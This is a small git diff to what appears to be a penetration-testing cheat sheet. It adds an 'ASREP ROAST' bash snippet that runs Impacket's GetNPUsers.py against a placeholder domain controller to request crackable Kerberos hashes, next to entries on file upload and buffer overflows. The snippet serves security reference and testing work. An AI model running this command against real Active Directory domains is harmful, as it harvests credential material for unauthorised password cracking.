@@ -604,6 +604,18 @@ upload {FILE.exe}
 
 ![Active Directory](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
 
+```bash
+
+# ASREP ROAST
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip {IP ADDRESS} -request '{DC.NAME}/'
+
+
+```
+
+
+
+
+
 <br />
 
 # Buffer Overflow
